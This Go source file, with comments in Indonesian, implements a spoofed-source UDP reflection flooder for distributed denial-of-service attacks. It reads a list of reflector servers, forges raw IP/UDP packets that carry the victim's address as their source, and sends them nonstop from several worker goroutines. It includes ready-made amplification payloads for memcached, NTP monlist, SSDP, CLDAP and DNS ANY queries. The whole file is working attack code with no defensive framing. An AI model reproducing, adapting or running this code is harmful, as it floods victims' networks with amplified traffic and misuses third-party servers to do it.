package vectors

import (
	"bufio"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"
)

// ReflectorFlooder — baca reflectors.txt, kirim spoof UDP ke setiap reflector
// source = target victim, destination = masing-masing reflector
type ReflectorFlooder struct {
	spoofSrc  string       // IP korban — yang akan nerima balasan
	reflectors []Reflector
	packets    atomic.Uint64
	fd         int
}

type Reflector struct {
	IP   string
	Port uint16
	Kind string
}

// NewReflectorFlooder baca file + buka raw socket sekali
func NewReflectorFlooder(file string, spoofSrc string) (*ReflectorFlooder, error) {
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var refs []Reflector
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) < 3 {
			continue
		}
		port, err := strconv.Atoi(parts[1])
		if err != nil {
			continue
		}
		refs = append(refs, Reflector{
			IP:   parts[0],
			Port: uint16(port),
			Kind: parts[2],
		})
	}

	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return nil, err
	}
	unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)

	return &ReflectorFlooder{
		spoofSrc:   spoofSrc,
		reflectors: refs,
		fd:         fd,
	}, nil
}

// payload per tipe reflector
func payloadFor(kind string) []byte {
	switch strings.ToLower(kind) {
	case "memcached":
		return []byte("stats\r\n")
	case "ntp":
		return []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
	case "ssdp":
		return []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n")
	case "cldap":
		return []byte{0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,0x02,
			0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,
			0x43,0x6c,0x61,0x73,0x73,0x30,0x00}
	case "dns":
		return []byte{0x12,0x34,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
			0x03,105,115,99,0x03,111,114,103,0x00,0x00,0xff,0x00,0x01}
	}
	return nil
}

// Run — loop semua reflector, kirim spoof terus-terusan
func (r *ReflectorFlooder) Run(stop <-chan struct{}, workers int) {
	if workers <= 0 {
		workers = 4
	}
	if len(r.reflectors) == 0 {
		return
	}

	// prepare dst + payload per reflector
	type target struct {
		addr    unix.SockaddrInet4
		payload []byte
		port    uint16
	}
	targets := make([]target, 0, len(r.reflectors))
	for _, ref := range r.reflectors {
		addr := unix.SockaddrInet4{Port: int(ref.Port)}
		// parse IP manual (hindari net.ParseIP overhead di hot loop)
		ip := parseIPv4(ref.IP)
		if ip == nil {
			continue
		}
		copy(addr.Addr[:], ip)
		payload := payloadFor(ref.Kind)
		if payload == nil {
			continue
		}
		targets = append(targets, target{addr: addr, payload: payload, port: ref.Port})
	}

	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(seed int64) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ seed))
			srcIP := parseIPv4(r.spoofSrc)
			if srcIP == nil {
				return
			}

			for {
				select {
				case <-stop:
					return
				default:
				}
				// pilih reflector acak, kirim paket
				t := targets[rng.Intn(len(targets))]
				pkt := buildUDPPacket(srcIP, t.addr.Addr[:], t.port, t.payload, rng)
				_ = unix.Sendto(r.fd, pkt, 0, &t.addr)
				r.packets.Add(1)
			}
		}(int64(w))
	}
	wg.Wait()
}

func (r *ReflectorFlooder) Packets() uint64 { return r.packets.Load() }
func (r *ReflectorFlooder) Count() int      { return len(r.reflectors) }

// helper: parse IPv4 string ke []byte tanpa alokasi net.IP
func parseIPv4(s string) []byte {
	var ip [4]byte
	n := 0
	cur := 0
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '.' {
			if n >= 4 {
				return nil
			}
			ip[n] = byte(cur)
			n++
			cur = 0
		} else if c >= '0' && c <= '9' {
			cur = cur*10 + int(c-'0')
		} else {
			return nil
		}
	}
	if n != 3 {
		return nil
	}
	ip[3] = byte(cur)
	return ip[:]
}

// buildUDPPacket — versi standalone (gak butuh struct UDPAmplifier)
func buildUDPPacket(srcIP, dstIP []byte, dstPort uint16, payload []byte, rng *rand.Rand) []byte {
	udpLen := 8 + len(payload)
	ipLen := 20 + udpLen
	pkt := make([]byte, ipLen)
	pkt[0] = 0x45
	pkt[2] = byte(ipLen >> 8)
	pkt[3] = byte(ipLen)
	pkt[4] = byte(rng.Intn(65535) >> 8)
	pkt[5] = byte(rng.Intn(65535))
	pkt[8] = 64
	pkt[9] = 17
	copy(pkt[12:16], srcIP)
	copy(pkt[16:20], dstIP)

	var sum uint32
	for i := 0; i+1 < 20; i += 2 {
		sum += uint32(pkt[i])<<8 | uint32(pkt[i+1])
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	cs := ^uint16(sum)
	pkt[10] = byte(cs >> 8)
	pkt[11] = byte(cs)

	udp := pkt[20:]
	sport := uint16(rng.Intn(64511) + 1024)
	udp[0] = byte(sport >> 8)
	udp[1] = byte(sport)
	udp[2] = byte(dstPort >> 8)
	udp[3] = byte(dstPort)
	udp[4] = byte(udpLen >> 8)
	udp[5] = byte(udpLen)
	copy(udp[8:], payload)

	var usum uint32
	usum += uint32(srcIP[0])<<8 | uint32(srcIP[1])
	usum += uint32(srcIP[2])<<8 | uint32(srcIP[3])
	usum += uint32(dstIP[0])<<8 | uint32(dstIP[1])
	usum += uint32(dstIP[2])<<8 | uint32(dstIP[3])
	usum += 17
	usum += uint32(udpLen)
	for i := 0; i+1 < udpLen; i += 2 {
		usum += uint32(udp[i])<<8 | uint32(udp[i+1])
	}
	for usum>>16 != 0 {
		usum = (usum & 0xffff) + (usum >> 16)
	}
	ucs := ^uint16(usum)
	if ucs == 0 {
		ucs = 0xffff
	}
	udp[6] = byte(ucs >> 8)
	udp[7] = byte(ucs)

	return pkt
}
